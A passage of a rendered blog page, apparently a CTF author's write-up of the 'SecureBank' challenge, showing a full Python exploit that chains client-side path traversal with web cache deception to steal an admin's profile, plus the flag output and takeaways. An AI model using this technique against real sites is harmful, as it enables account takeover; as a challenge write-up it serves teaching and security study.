+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;https://0q930pc949s2.ctfhub.io&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">auth_token</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s2">&#34;http://localhost:8080&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;https&#34;</span><span class="p">:</span> <span class="s2">&#34;http://localhost:8080&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/api/register&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;email&#34;</span><span class="p">:</span> <span class="n">email</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Registration response: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/api/login&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">auth_token</span>
+</span></span><span class="line"><span class="cl">    <span class="n">auth_token</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;auth_token&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Login response: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">, Auth Token: </span><span class="si">{</span><span class="n">auth_token</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_profile</span><span class="p">(</span><span class="n">user_id</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/api/profile/</span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">report_url</span><span class="p">(</span><span class="n">auth_token</span><span class="p">,</span> <span class="n">url_to_report</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/api/report&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;X-Auth-Token&#34;</span><span class="p">:</span> <span class="n">auth_token</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;url&#34;</span><span class="p">:</span> <span class="n">url_to_report</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Report URL response: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># --- Exploit Flow ---</span>
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;asdf1234&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">email</span> <span class="o">=</span> <span class="s2">&#34;email&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;@gmail.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;password123&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">register</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">malicious_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/profile?userId=../../../../../../api/profile/asdf_</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">.css&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">report_url</span><span class="p">(</span><span class="n">auth_token</span><span class="p">,</span> <span class="n">malicious_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">get_profile</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;asdf_</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">.css&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>{&#39;email&#39;: &#39;admin@example.com&#39;, &#39;flag&#39;: &#39;flag{cache_deception_with_cspt_gadget_thats_absolute_cinema}&#39;, &#39;user_id&#39;: &#39;707f09fc9547f88b&#39;, &#39;username&#39;: &#39;Administrator&#39;}</code></pre></div>
+<p><img
+        class="lazyload"
+        src="/blog/svg/loading.min.svg"
+        data-src="/blog/images/snyk_ctf_secure_bank/image-6.png"
+        data-srcset="/blog/images/snyk_ctf_secure_bank/image-6.png, /blog/images/snyk_ctf_secure_bank/image-6.png 1.5x, /blog/images/snyk_ctf_secure_bank/image-6.png 2x"
+        data-sizes="auto"
+        alt="/blog/images/snyk_ctf_secure_bank/image-6.png"
+        title="Exploit output, admin flag retrieved" /></p>
+<hr>
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li><strong>Neither vulnerability was critical on its own.</strong> The cache deception needed an authenticated trigger; the CSPT had no direct impact. Together, they produced a full account takeover.</li>
+<li><strong>CSPT is an underrated gadget.</strong> It doesn&rsquo;t just redirect navigations, it can weaponize <code>fetch()</code> calls that carry auth tokens, turning innocent client-side code into an attacker-controlled HTTP client.</li>
+</ul>
+<p>Thanks to Snyk and HackingHub for hosting the CTF, I hope players enjoyed the challenge!</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2026-02-17</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/blog/posts/snyk_ctf_secure_bank/" data-title="Snyk CTF SecureBank - Chaining Cache Deception &amp; CSPT for Account Takeover" data-via="Benhibafodhil" data-hashtags="ctf,web security,my_challenges"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/blog/posts/snyk_ctf_secure_bank/" data-title="Snyk CTF SecureBank - Chaining Cache Deception &amp; CSPT for Account Takeover"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/blog/posts/snyk_ctf_secure_bank/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/blog/posts/snyk_ctf_secure_bank/" data-title="Snyk CTF SecureBank - Chaining Cache Deception &amp; CSPT for Account Takeover"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/blog/posts/snyk_ctf_secure_bank/" data-title="Snyk CTF SecureBank - Chaining Cache Deception &amp; CSPT for Account Takeover"><i data-svg-src="/blog/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/blog/posts/snyk_ctf_secure_bank/" data-title="Snyk CTF SecureBank - Chaining Cache Deception &amp; CSPT for Account Takeover"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/blog/posts/snyk_ctf_secure_bank/" data-title="Snyk CTF SecureBank - Chaining Cache Deception &amp; CSPT for Account Takeover" data-description=""><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fsnyk_ctf_secure_bank%2f&amp;text=Snyk%20CTF%20SecureBank%20-%20Chaining%20Cache%20Deception%20%26%20CSPT%20for%20Account%20Takeover" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/blog/tags/ctf/">Ctf</a>,&nbsp;<a href="/blog/tags/web-security/">Web Security</a>,&nbsp;<a href="/blog/tags/my_challenges/">My_challenges</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/blog/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/blog/posts/cybears_ctf_web_file_manager/" class="prev" rel="prev" title="Cybears ctf web/file manager"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Cybears ctf web/file manager</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/blog/" target="_blank">F0DH1L</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/blog/css/custom.css"><script src="/blog/lib/lazysizes/lazysizes.min.js"></script><script src="/blog/lib/clipboard/clipboard.min.js"></script><script src="/blog/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/blog/js/theme.min.js"></script></body>
+</html>
